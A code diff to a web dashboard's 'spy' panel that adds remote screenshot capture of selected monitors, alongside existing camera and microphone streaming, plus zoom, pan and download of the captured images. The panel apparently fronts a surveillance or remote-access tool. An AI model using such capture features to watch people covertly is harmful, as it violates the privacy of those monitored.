@@ -4612,21 +4612,34 @@
               <input id="${tabId}-vol" type="range" min="0" max="100" value="80" oninput="spySetVolume('${tabId}',this.value)" style="width:50px;height:3px;accent-color:#a78bfa;cursor:pointer" title="Playback Volume" />
               <span id="${tabId}-vol-label" style="font-size:8px;color:rgba(255,255,255,.3);font-family:'JetBrains Mono',monospace;min-width:22px">80%</span>
             </div>
+            <div style="display:flex;align-items:center;gap:5px;min-width:0;flex:1 1 200px">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#fb923c" stroke-width="2" stroke-linecap="round" style="flex-shrink:0"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+              <select id="${tabId}-monitor-select" style="padding:3px 6px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:5px;color:#e2e8f0;font-size:10px;min-width:0;flex:1;overflow:hidden;text-overflow:ellipsis"><option value="0">Loading...</option></select>
+              <button id="${tabId}-ss-btn" onclick="spyScreenshot('${tabId}')" style="padding:3px 10px;border-radius:5px;border:1px solid rgba(251,146,60,.2);background:rgba(251,146,60,.1);color:#fb923c;cursor:pointer;font-size:10px;font-weight:600;white-space:nowrap;flex-shrink:0;display:flex;align-items:center;gap:4px"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>Capture</button>
+            </div>
             <button onclick="spyLoadDevices('${tabId}')" style="padding:3px 8px;border-radius:5px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.04);color:rgba(255,255,255,.4);cursor:pointer;font-size:10px;display:flex;align-items:center;gap:3px;flex-shrink:0;transition:all .15s" onmouseenter="this.style.color='#e2e8f0';this.style.borderColor='rgba(255,255,255,.15)'" onmouseleave="this.style.color='rgba(255,255,255,.4)';this.style.borderColor='rgba(255,255,255,.08)'" title="Refresh device list"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 2v6h-6"/><path d="M3 12a9 9 0 0 1 15-6.7L21 8M3 22v-6h6"/><path d="M21 12a9 9 0 0 1-15 6.7L3 16"/></svg></button>
           </div>
           <div style="flex:1;display:flex;flex-direction:column;min-height:0;overflow:hidden">
             <!-- Camera viewport -->
-            <div style="flex:1;display:flex;align-items:center;justify-content:center;background:#000;position:relative;min-height:0">
+            <div id="${tabId}-viewport" style="flex:1;display:flex;align-items:center;justify-content:center;background:#000;position:relative;min-height:0;overflow:hidden;cursor:grab">
               <div id="${tabId}-cam-placeholder" style="display:flex;flex-direction:column;align-items:center;gap:12px;color:rgba(255,255,255,.15)">
                 <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
                 <span style="font-size:12px;letter-spacing:2px;text-transform:uppercase">No Signal</span>
               </div>
-              <img id="${tabId}-cam-feed" style="display:none;width:100%;height:100%;object-fit:contain" />
+              <img id="${tabId}-cam-feed" style="display:none;max-width:100%;max-height:100%;object-fit:contain;transform-origin:center center;transition:transform 80ms ease-out" />
               <div id="${tabId}-cam-rec" style="display:none;position:absolute;top:12px;left:12px;display:flex;align-items:center;gap:6px;padding:4px 10px;background:rgba(0,0,0,.6);border-radius:6px;backdrop-filter:blur(4px)">
                 <div style="width:8px;height:8px;background:#ef4444;border-radius:50%;animation:pulse .8s infinite"></div>
                 <span style="font-size:10px;color:#ef4444;font-weight:600;letter-spacing:1px">REC</span>
               </div>
               <div id="${tabId}-cam-fps" style="display:none;position:absolute;bottom:12px;right:12px;padding:3px 8px;background:rgba(0,0,0,.6);border-radius:4px;font-size:9px;color:rgba(255,255,255,.5);font-family:'JetBrains Mono',monospace;backdrop-filter:blur(4px)">0 fps</div>
+              <!-- Zoom & download controls -->
+              <div id="${tabId}-img-controls" style="display:none;position:absolute;top:12px;right:12px;display:flex;gap:4px;z-index:5">
+                <button onclick="spyZoom('${tabId}',1)" style="width:28px;height:28px;border-radius:6px;border:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.6);color:rgba(255,255,255,.7);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)" title="Zoom in">+</button>
+                <button onclick="spyZoom('${tabId}',-1)" style="width:28px;height:28px;border-radius:6px;border:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.6);color:rgba(255,255,255,.7);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)" title="Zoom out">-</button>
+                <button onclick="spyZoom('${tabId}',0)" style="width:28px;height:28px;border-radius:6px;border:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.6);color:rgba(255,255,255,.7);cursor:pointer;font-size:11px;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);font-family:'JetBrains Mono',monospace" title="Reset zoom">1:1</button>
+                <button onclick="spyDownload('${tabId}')" style="width:28px;height:28px;border-radius:6px;border:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.6);color:rgba(255,255,255,.7);cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)" title="Download"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></button>
+              </div>
+              <div id="${tabId}-zoom-label" style="display:none;position:absolute;bottom:12px;left:12px;padding:3px 8px;background:rgba(0,0,0,.6);border-radius:4px;font-size:9px;color:rgba(255,255,255,.5);font-family:'JetBrains Mono',monospace;backdrop-filter:blur(4px)">100%</div>
             </div>
             <!-- Audio visualizer bar -->
             <div id="${tabId}-audio-panel" style="height:72px;border-top:1px solid rgba(255,255,255,.06);position:relative;background:linear-gradient(180deg,rgba(10,10,30,.8),rgba(5,5,20,.9));overflow:hidden;display:flex;align-items:center">
@@ -6888,13 +6901,196 @@
 
     async function spyLoadDevices(tabId) {
       try {
-        const r = await fetch('/api/spy/devices');
-        const d = await r.json();
+        const [devR, monR] = await Promise.all([fetch('/api/spy/devices'), fetch('/api/spy/monitors')]);
+        const d = await devR.json();
+        const monitors = await monR.json();
         const camSel = document.getElementById(tabId + '-cam-select');
         const micSel = document.getElementById(tabId + '-mic-select');
+        const monSel = document.getElementById(tabId + '-monitor-select');
         camSel.innerHTML = d.video.length ? d.video.map((v, i) => `<option value="${v}"${i === 0 ? ' selected' : ''}>${v}</option>`).join('') : '<option value="">No cameras found</option>';
         micSel.innerHTML = d.audio.length ? d.audio.map((a, i) => `<option value="${a}"${i === 0 ? ' selected' : ''}>${a}</option>`).join('') : '<option value="">No mics found</option>';
+        if (monSel) monSel.innerHTML = monitors.length ? monitors.map((m, i) => `<option value="${i}"${m.Primary ? ' selected' : ''}>${m.Name.replace('\\\\.\\','')} ${m.W}x${m.H}${m.Primary ? ' (Primary)' : ''}</option>`).join('') : '<option value="0">Desktop</option>';
       } catch (e) { console.error('Failed to load spy devices:', e); }
+    }
+
+    async function spyScreenshot(tabId) {
+      const btn = document.getElementById(tabId + '-ss-btn');
+      const monSel = document.getElementById(tabId + '-monitor-select');
+      const monitor = monSel ? monSel.value : '0';
+      const feed = document.getElementById(tabId + '-cam-feed');
+      const placeholder = document.getElementById(tabId + '-cam-placeholder');
+      const origText = btn.innerHTML;
+      btn.innerHTML = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" style="animation:spin 1s linear infinite"><path d="M21 2v6h-6"/><path d="M3 12a9 9 0 0 1 15-6.7L21 8"/></svg>Capturing...';
+      btn.disabled = true;
+      try {
+        const r = await fetch('/api/spy/screenshot?monitor=' + monitor);
+        if (!r.ok) throw new Error('Capture failed');
+        const blob = await r.blob();
+        const url = URL.createObjectURL(blob);
+        const state = _spyState[tabId] || {};
+        if (state.ssUrl) URL.revokeObjectURL(state.ssUrl);
+        state.ssUrl = url;
+        state.ssBlob = blob;
+        state.zoomLevel = 1;
+        state.panX = 0; state.panY = 0;
+        feed.src = url;
+        feed.style.display = 'block';
+        feed.style.transform = 'scale(1) translate(0px,0px)';
+        placeholder.style.display = 'none';
+        // Show controls
+        const ctrl = document.getElementById(tabId + '-img-controls');
+        const zLabel = document.getElementById(tabId + '-zoom-label');
+        if (ctrl) ctrl.style.display = 'flex';
+        if (zLabel) { zLabel.style.display = 'block'; zLabel.textContent = '100%'; }
+        _spyState[tabId] = state;
+        spyInitPan(tabId);
+      } catch (e) {
+        console.error('Screenshot failed:', e);
+      }
+      btn.innerHTML = origText;
+      btn.disabled = false;
+    }
+
+    function spyZoom(tabId, dir) {
+      const state = _spyState[tabId];
+      if (!state) return;
+      if (dir === 0) {
+        state.zoomLevel = 1; state.panX = 0; state.panY = 0;
+      } else {
+        state.zoomLevel = Math.max(0.5, Math.min(10, state.zoomLevel * (dir > 0 ? 1.5 : 0.667)));
+        if (state.zoomLevel <= 1) { state.panX = 0; state.panY = 0; }
+      }
+      _spyApplyTransform(tabId, true);
+    }
+
+    function _spyApplyTransform(tabId, smooth) {
+      const state = _spyState[tabId];
+      if (!state) return;
+      const feed = document.getElementById(tabId + '-cam-feed');
+      const zLabel = document.getElementById(tabId + '-zoom-label');
+      if (feed) {
+        feed.style.transition = smooth ? 'transform 200ms ease-out' : 'none';
+        feed.style.transform = `scale(${state.zoomLevel}) translate(${state.panX}px,${state.panY}px)`;
+      }
+      if (zLabel) zLabel.textContent = Math.round(state.zoomLevel * 100) + '%';
+      const vp = document.getElementById(tabId + '-viewport');
+      if (vp) vp.style.cursor = state.zoomLevel > 1 ? 'grab' : 'default';
+    }
+
+    function spyInitPan(tabId) {
+      const vp = document.getElementById(tabId + '-viewport');
+      if (!vp || vp._panInit) return;
+      vp._panInit = true;
+      let dragging = false, lastX, lastY;
+      // Mouse wheel zoom — zoom toward cursor position
+      vp.addEventListener('wheel', (e) => {
+        e.preventDefault();
+        const state = _spyState[tabId];
+        if (!state) return;
+        const feed = document.getElementById(tabId + '-cam-feed');
+        if (!feed) return;
+        const rect = vp.getBoundingClientRect();
+        const cx = (e.clientX - rect.left - rect.width / 2) / state.zoomLevel;
+        const cy = (e.clientY - rect.top - rect.height / 2) / state.zoomLevel;
+        const oldZoom = state.zoomLevel;
+        const factor = e.deltaY > 0 ? 0.9 : 1.1;
+        state.zoomLevel = Math.max(0.5, Math.min(10, state.zoomLevel * factor));
+        if (state.zoomLevel <= 1) {
+          state.panX = 0; state.panY = 0;
+        } else {
+          // Adjust pan to zoom toward cursor
+          const ratio = 1 - state.zoomLevel / oldZoom;
+          state.panX += cx * ratio;
+          state.panY += cy * ratio;
+        }
+        _spyApplyTransform(tabId, false);
+      }, { passive: false });
+      // Mouse drag pan — smooth with RAF
+      let _rafPan = null;
+      vp.addEventListener('mousedown', (e) => {
+        const state = _spyState[tabId];
+        if (!state || state.zoomLevel <= 1) return;
+        e.preventDefault();
+        dragging = true; lastX = e.clientX; lastY = e.clientY;
+        vp.style.cursor = 'grabbing';
+      });
+      window.addEventListener('mousemove', (e) => {
+        if (!dragging) return;
+        const dx = e.clientX - lastX;
+        const dy = e.clientY - lastY;
+        lastX = e.clientX; lastY = e.clientY;
+        const state = _spyState[tabId];
+        if (!state) return;
+        state.panX += dx / state.zoomLevel;
+        state.panY += dy / state.zoomLevel;
+        if (!_rafPan) {
+          _rafPan = requestAnimationFrame(() => {
+            _spyApplyTransform(tabId, false);
+            _rafPan = null;
+          });
+        }
+      });
+      window.addEventListener('mouseup', () => {
+        if (dragging) { dragging = false; vp.style.cursor = 'grab'; }
+      });
+      // Double-click to toggle zoom
+      vp.addEventListener('dblclick', (e) => {
+        const state = _spyState[tabId];
+        if (!state) return;
+        if (state.zoomLevel > 1) {
+          state.zoomLevel = 1; state.panX = 0; state.panY = 0;
+        } else {
+          state.zoomLevel = 3;
+          const rect = vp.getBoundingClientRect();
+          state.panX = -(e.clientX - rect.left - rect.width / 2) / state.zoomLevel;
+          state.panY = -(e.clientY - rect.top - rect.height / 2) / state.zoomLevel;
+        }
+        _spyApplyTransform(tabId, true);
+      });
+      // Touch pinch zoom + drag
+      let lastTouchDist = 0, lastTouchX, lastTouchY;
+      vp.addEventListener('touchstart', (e) => {
+        const state = _spyState[tabId];
+        if (!state) return;
+        if (e.touches.length === 2) {
+          lastTouchDist = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
+        } else if (e.touches.length === 1 && state.zoomLevel > 1) {
+          lastTouchX = e.touches[0].clientX; lastTouchY = e.touches[0].clientY;
+        }
+      }, { passive: true });
+      vp.addEventListener('touchmove', (e) => {
+        const state = _spyState[tabId];
+        if (!state) return;
+        if (e.touches.length === 2) {
+          e.preventDefault();
+          const dist = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
+          if (lastTouchDist) {
+            state.zoomLevel = Math.max(0.5, Math.min(10, state.zoomLevel * (dist / lastTouchDist)));
+            if (state.zoomLevel <= 1) { state.panX = 0; state.panY = 0; }
+            _spyApplyTransform(tabId);
+          }
+          lastTouchDist = dist;
+        } else if (e.touches.length === 1 && state.zoomLevel > 1) {
+          e.preventDefault();
+          state.panX += (e.touches[0].clientX - lastTouchX) / state.zoomLevel;
+          state.panY += (e.touches[0].clientY - lastTouchY) / state.zoomLevel;
+          lastTouchX = e.touches[0].clientX; lastTouchY = e.touches[0].clientY;
+          _spyApplyTransform(tabId);
+        }
+      }, { passive: false });
+      vp.addEventListener('touchend', () => { lastTouchDist = 0; }, { passive: true });
+    }
+
+    function spyDownload(tabId) {
+      const state = _spyState[tabId];
+      if (!state) return;
+      const feed = document.getElementById(tabId + '-cam-feed');
+      if (!feed || !feed.src) return;
+      const a = document.createElement('a');
+      a.href = feed.src;
+      const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+      a.download = 'spy-capture-' + ts + '.jpg';
+      a.click();
     }
 
     function spySetVolume(tabId, val) {
@@ -6930,6 +7126,12 @@
         rec.style.display = 'none';
         const fpsEl = document.getElementById(tabId + '-cam-fps');
         if (fpsEl) fpsEl.style.display = 'none';
+        const ctrl = document.getElementById(tabId + '-img-controls');
+        const zLabel = document.getElementById(tabId + '-zoom-label');
+        if (ctrl) ctrl.style.display = 'none';
+        if (zLabel) zLabel.style.display = 'none';
+        state.zoomLevel = 1; state.panX = 0; state.panY = 0;
+        feed.style.transform = '';
         btn.textContent = 'Start';
         btn.style.color = '#60a5fa'; btn.style.borderColor = 'rgba(96,165,250,.2)'; btn.style.background = 'rgba(96,165,250,.1)';
         state.camActive = false;
@@ -6956,6 +7158,9 @@
           placeholder.style.display = 'none';
           rec.style.display = 'flex';
           if (fpsEl) fpsEl.style.display = 'block';
+          const ctrl = document.getElementById(tabId + '-img-controls');
+          if (ctrl) ctrl.style.display = 'flex';
+          spyInitPan(tabId);
         };
         ws.onclose = () => { if (state.camActive) spyToggleCamera(tabId); };
         state.camWs = ws;
